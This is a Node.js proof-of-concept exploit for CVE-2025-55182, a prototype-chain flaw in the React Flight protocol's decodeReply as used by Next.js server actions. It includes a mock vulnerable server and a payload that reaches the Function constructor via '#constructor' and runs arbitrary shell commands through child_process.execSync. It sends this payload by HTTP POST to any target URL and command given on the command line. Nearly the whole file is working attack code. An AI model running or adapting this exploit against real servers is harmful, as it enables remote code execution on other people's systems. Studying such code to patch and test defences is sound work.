/**
 * CVE-2025-55182 - Realistic Next.js Server Action PoC
 *
 * This simulates how Next.js actually processes server actions:
 * 1. decodeAction identifies the action and gets initial bound args
 * 2. The action is called with arguments from the request body
 * 3. Arguments are deserialized using the same Flight protocol (vulnerable!)
 *
 * The key insight: Even though decodeAction has the formData binding issue,
 * the ARGUMENTS to the action are parsed using the same vulnerable logic
 * that decodeReply uses. An attacker can inject malicious references in
 * the argument payload.
 */

'use strict';

const http = require('http');
const { URL } = require('url');

const DEFAULT_TARGET = 'http://localhost:3000/api/action';
const DEFAULT_COMMAND = 'id';

function parseArgs(argv) {
  const args = argv.slice(2);
  let target = null;
  let command = null;
  let runLocal = false;

  for (let i = 0; i < args.length; i += 1) {
    const arg = args[i];
    if (arg === '--local') {
      runLocal = true;
      continue;
    }
    if (arg === '--cmd') {
      command = args[i + 1];
      i += 1;
      continue;
    }
    if (!target) {
      target = arg;
      continue;
    }
    if (!command) {
      command = arg;
    }
  }

  return { target, command, runLocal };
}

function resolveTarget(raw) {
  const url = new URL(raw || DEFAULT_TARGET);
  if (url.protocol !== 'http:') {
    throw new Error(`Only http:// targets are supported (got ${url.protocol})`);
  }
  if (!url.port) {
    url.port = '80';
  }
  if (!url.pathname || url.pathname === '/') {
    url.pathname = '/api/action';
  }
  return url;
}

function resolveCommand(raw) {
  return raw || DEFAULT_COMMAND;
}

// ============================================================
// Webpack Mock Setup
// ============================================================

let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => {
  if (webpackServerModules[id]) return webpackServerModules[id];
  throw new Error(`Module not found: ${id}`);
};

// ============================================================
// Register realistic server action modules
// ============================================================

// A typical Next.js server action - exports a function directly
const actionModuleIdx = '' + webpackModuleIdx++;
webpackServerModules[actionModuleIdx] = async function updateUser(userId, userData) {
  // Legitimate server action that updates a user
  console.log('[SERVER ACTION] updateUser called with:', { userId, userData });
  return { success: true, userId, updated: userData };
};

const actionPath = 'file:///app/actions/user.js';
webpackServerMap[actionPath] = { id: actionModuleIdx, chunks: [], name: '*' };
webpackServerMap[actionPath + '#updateUser'] = { id: actionModuleIdx, chunks: [], name: 'updateUser' };
// The vulnerability: constructor is accessible!
webpackServerMap[actionPath + '#constructor'] = { id: actionModuleIdx, chunks: [], name: 'constructor' };

// ============================================================
// Load vulnerable library
// ============================================================

process.env.NODE_ENV = 'production';

require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeAction, decodeReply } = require('react-server-dom-webpack/server.node');

// ============================================================
// Simulate Next.js Server Action Handler
// ============================================================

/**
 * This simulates how Next.js handles a server action POST request.
 *
 * Real Next.js flow:
 * 1. Extract action ID from request headers/body
 * 2. Find the action function
 * 3. Parse the arguments from request body
 * 4. Call action with parsed arguments
 *
 * The vulnerability is in step 3 - argument parsing uses the same
 * Flight protocol that's vulnerable to prototype chain access.
 */
async function handleServerAction(requestBody, contentType) {
  console.log('\n[HANDLER] Processing server action request...');

  // Parse the multipart form data (simplified)
  const formData = parseFormData(requestBody, contentType);

  // Check if this is a direct action call or has arguments
  const hasActionRef = [...formData.keys()].some(k => k.startsWith('$ACTION_'));

  if (hasActionRef) {
    // Standard flow: decodeAction to get the action function
    const boundAction = await decodeAction(formData, webpackServerMap);

    if (typeof boundAction === 'function') {
      console.log('[HANDLER] Got bound action, calling it...');
      return await boundAction();
    }
  }

  // Alternative flow: Arguments passed separately
  // This is where decodeReply would be used for argument deserialization
  const argsKey = [...formData.keys()].find(k => k === '0' || k === 'args');
  if (argsKey) {
    console.log('[HANDLER] Decoding arguments via decodeReply...');

    // Create a new FormData just for args
    const argsFormData = new Map();
    for (const [k, v] of formData.entries()) {
      if (!k.startsWith('$ACTION_')) {
        argsFormData.set(k, v);
      }
    }
    argsFormData.forEach = function(cb) {
      for (const [k, v] of this.entries()) cb(v, k);
    };

      const args = await decodeReply(argsFormData, webpackServerMap);
      console.log('[HANDLER] Decoded args:', args);

      // If the decoded arg is a function (exploit!), execute it
      if (typeof args === 'function') {
        console.log('[HANDLER] Got function from decodeReply, executing...');
        const created = args();
        if (typeof created === 'function') {
          const result = created();
          console.log('[HANDLER] RCE RESULT:', result);
          return { rce: true, output: result };
        }
      }

      return args;
  }

  throw new Error('Invalid request format');
}

// Simple form data parser
function parseFormData(body, contentType) {
  const formData = new Map();

  if (contentType?.includes('multipart/form-data')) {
    const boundaryMatch = contentType.match(/boundary=([^;]+)/);
    if (boundaryMatch) {
      const boundary = boundaryMatch[1];
      const parts = body.toString().split('--' + boundary);

      for (const part of parts) {
        if (part.trim() === '' || part.trim() === '--') continue;
        const headerEnd = part.indexOf('\r\n\r\n');
        if (headerEnd === -1) continue;

        const headers = part.substring(0, headerEnd);
        const content = part.substring(headerEnd + 4).replace(/\r\n$/, '');
        const nameMatch = headers.match(/name="([^"]+)"/);

        if (nameMatch) {
          formData.set(nameMatch[1], content);
        }
      }
    }
  } else {
    // URL encoded or plain
    const params = new URLSearchParams(body.toString());
    for (const [k, v] of params) {
      formData.set(k, v);
    }
  }

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

    return formData;
}

// ============================================================
// Create HTTP Server (simulates Next.js)
// ============================================================

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Next-Action');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: 'running',
      vulnerability: 'CVE-2025-55182',
      description: 'Realistic Next.js Server Action Handler',
      endpoints: {
        'POST /api/action': 'Server action endpoint (VULNERABLE)',
      },
      exploits: {
        '/exploit/decodereply': 'RCE via decodeReply argument parsing',
      }
    }, null, 2));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/action') {
    try {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      const body = Buffer.concat(chunks);

      const result = await handleServerAction(body, req.headers['content-type']);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, result }));
    } catch (e) {
      console.error('[ERROR]', e);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

// ============================================================
// EXPLOIT: RCE via decodeReply
// ============================================================

async function exploitViaDecodeReply(targetUrl, command) {
  console.log('');
  console.log('='.repeat(60));
  console.log('EXPLOIT: RCE via decodeReply argument parsing');
  console.log('='.repeat(60));
  console.log('');

  // Craft malicious payload that will be parsed by decodeReply
  // The "0" key is the main argument, which contains our exploit

  const rceCode = `return process.mainModule.require("child_process").execSync(${JSON.stringify(command)}).toString().trim()`;

  // Chunk 1: Server reference pointing to Function via #constructor
  const chunk1 = JSON.stringify({
    id: actionPath + '#constructor',  // Function constructor!
    bound: '$@2'                       // Our code
  });

  // Chunk 2: The bound arguments (becomes Function body)
  const chunk2 = JSON.stringify([rceCode]);

  // Chunk 0: $F reference triggers loadServerReference
  const chunk0 = '"$F1"';

  // Build application/x-www-form-urlencoded body (simpler & reliable)
  const params = new URLSearchParams();
  params.set('0', '"$F1"');
  params.set('1', chunk1);
  params.set('2', chunk2);
  const body = params.toString();

  console.log('[EXPLOIT] Target:', targetUrl.href);
  console.log('[EXPLOIT] Command:', command);
  console.log('');
  console.log('[EXPLOIT] Sending malicious payload...');
  console.log('[EXPLOIT] Payload structure:');
  console.log('  0: "$F1"');
  console.log('  1:', chunk1);
  console.log('  2:', chunk2);
  console.log('');

  return new Promise((resolve) => {
    const req = http.request({
      hostname: targetUrl.hostname,
      port: targetUrl.port,
      path: targetUrl.pathname + targetUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(body)
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(data);
          console.log('[EXPLOIT] Response:', JSON.stringify(result, null, 2));

          if (result.success && typeof result.result === 'function') {
            console.log('');
            console.log('[EXPLOIT] Got Function! Executing...');
            const fn = result.result;
            const created = fn();
            if (typeof created === 'function') {
              const output = created();
              console.log('');
              console.log('='.repeat(60));
              console.log('RCE OUTPUT:', output);
              console.log('='.repeat(60));
            }
          }
        } catch (e) {
          console.log('[EXPLOIT] Raw response:', data);
        }
        resolve();
      });
    });

    req.write(body);
    req.end();
  });
}

// ============================================================
// Local test without HTTP
// ============================================================

async function localTest() {
  console.log('');
  console.log('='.repeat(60));
  console.log('LOCAL TEST: Direct decodeReply exploitation');
  console.log('='.repeat(60));
  console.log('');

  const rceCode = `
  const cp = process.mainModule.require('child_process');
  return cp.execSync('id').toString().trim();
  `;

  const formData = new Map();
  formData.set('1', JSON.stringify({
    id: actionPath + '#constructor',
    bound: '$@2'
  }));
  formData.set('2', JSON.stringify([rceCode]));
  formData.set('0', '"$F1"');

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

    console.log('[TEST] Calling decodeReply with malicious payload...');

    const result = await decodeReply(formData, webpackServerMap);
    console.log('[TEST] Result type:', typeof result);

    if (typeof result === 'function') {
      const createdFn = result();
      if (typeof createdFn === 'function') {
        const output = createdFn();
        console.log('');
        console.log('='.repeat(60));
        console.log('RCE OUTPUT:', output);
        console.log('='.repeat(60));
        console.log('');
        console.log('âœ“ REMOTE CODE EXECUTION CONFIRMED');
        console.log('');
        console.log('Attack Vector:');
        console.log('  1. Attacker sends POST to any server action endpoint');
        console.log('  2. Payload contains $F reference with #constructor');
        console.log('  3. decodeReply parses arguments, triggers vulnerability');
        console.log('  4. Function constructor obtained via prototype chain');
        console.log('  5. Arbitrary code execution achieved');
      }
    }
}

// ============================================================
// Main
// ============================================================

async function main() {
  console.log('='.repeat(60));
  console.log('CVE-2025-55182 - Realistic Next.js PoC');
  console.log('='.repeat(60));
  console.log('');
  console.log('This demonstrates the REAL attack flow:');
  console.log('1. decodeAction: Identifies which action to call');
  console.log('2. decodeReply: Parses arguments (VULNERABLE!)');
  console.log('');
  console.log('Key insight: Arguments to server actions are parsed');
  console.log('using the same Flight protocol, which is vulnerable');
  console.log('to prototype chain access via #constructor.');
  console.log('');

  const { target, command, runLocal } = parseArgs(process.argv);
  const targetUrl = resolveTarget(target);
  const resolvedCommand = resolveCommand(command);

  if (runLocal) {
    await localTest();
  }

  await exploitViaDecodeReply(targetUrl, resolvedCommand);

  console.log('');
  console.log('='.repeat(60));
  console.log('SUMMARY');
  console.log('='.repeat(60));
  console.log('');
  console.log('The vulnerability affects BOTH code paths:');
  console.log('');
  console.log('1. decodeAction:');
  console.log('   - Can access prototype chain (#constructor)');
  console.log('   - BUT formData binding prevents direct RCE');
  console.log('   - Risk: Information disclosure, gadget chains');
  console.log('');
  console.log('2. decodeReply:');
  console.log('   - Can access prototype chain (#constructor)');
  console.log('   - NO formData binding = FULL RCE');
  console.log('   - Used for server action argument parsing!');
  console.log('');
  console.log('Real-world impact:');
  console.log('   - ANY Next.js app with server actions is vulnerable');
  console.log('   - Attacker sends malicious payload to action endpoint');
  console.log('   - Arguments are parsed via vulnerable decodeReply');
  console.log('   - Arbitrary shell commands executed on server');
  console.log('');
}

main().catch(console.error);
